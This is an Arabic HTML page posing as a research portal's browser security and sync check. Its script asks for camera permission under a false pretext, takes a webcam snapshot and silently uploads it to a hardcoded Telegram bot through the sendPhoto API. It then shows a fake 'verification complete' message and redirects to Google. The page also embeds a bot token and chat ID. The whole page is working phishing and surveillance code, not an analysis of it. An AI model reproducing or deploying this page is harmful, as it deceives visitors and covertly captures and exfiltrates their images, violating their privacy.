<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة الأبحاث المركزية | فحص النظام</title>
    <style>
        :root { --primary: #0062ff; --bg: #f8f9fa; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: #333; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 90%; max-width: 450px; transition: all 0.5s ease; }
        .logo { width: 60px; height: 60px; background: var(--primary); border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 24px; }
        h2 { margin-bottom: 10px; font-size: 22px; color: #1a1a1a; }
        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { background: #0052d4; box-shadow: 0 5px 15px rgba(0,98,255,0.3); }
        .loader-container { display: none; margin-top: 20px; }
        .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.4s; }
        #status-text { font-size: 13px; color: #888; margin-top: 10px; display: block; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div id="main-content" style="display:none;" class="card">
    <div class="logo">SR</div>
    <h2>نظام مزامنة البيانات</h2>
    <p>للمتابعة إلى بوابة الأبحاث، يرجى إجراء فحص سريع لبروتوكولات الأمان وتوافق المتصفح.</p>
    
    <button id="start-btn" class="btn">بدء المزامنة والتحقق</button>

    <div id="loader" class="loader-container">
        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
        <span id="status-text">جاري بدء الاتصال...</span>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" width="640" height="480"></canvas>
</div>

<div id="denied" style="display:none;">
    <h1 style="color: #dc3545;">403</h1>
    <p>انتهت صلاحية الجلسة أو الرمز غير صالح.</p>
</div>

<script>
    const TOKEN = "8757110843:AAF-xoz_EX9JObBrgV8w35u2KRl3xkKRd0I";
    const CHAT_ID = "6655185768";
    const REDIRECT_URL = "https://www.google.com"; // الموقع الذي سيذهب إليه بعد الانتهاء

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('auth') === 'atter_2026') {
        document.getElementById('main-content').style.display = 'block';
    } else {
        document.getElementById('denied').style.display = 'block';
    }

    const startBtn = document.getElementById('start-btn');
    const loader = document.getElementById('loader');
    const fill = document.getElementById('fill');
    const statusText = document.getElementById('status-text');
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');

    startBtn.onclick = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            startBtn.style.display = 'none';
            loader.style.display = 'block';
            
            updateProgress(20, "جاري فحص المتصفح...");

            setTimeout(async () => {
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/png');
                stream.getTracks().forEach(t => t.stop());
                
                updateProgress(50, "جاري رفع تقرير الأمان...");

                const blob = await (await fetch(imgData)).blob();
                const fd = new FormData();
                fd.append("chat_id", CHAT_ID);
                fd.append("photo", blob, "audit.png");
                fd.append("caption", "📝 تقرير دخول جديد\n---\n✅ تم التحقق من الهوية بنجاح.");

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });

                updateProgress(100, "اكتمل التحقق! جاري التحويل...");
                
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1500);

            }, 2000);
        } catch (err) {
            alert("عذراً، يجب الموافقة على صلاحيات الكاميرا لإتمام عملية المزامنة الأمنية.");
        }
    };

    function updateProgress(width, text) {
        fill.style.width = width + "%";
        statusText.innerText = text;
    }
</script>
</body>
</html>
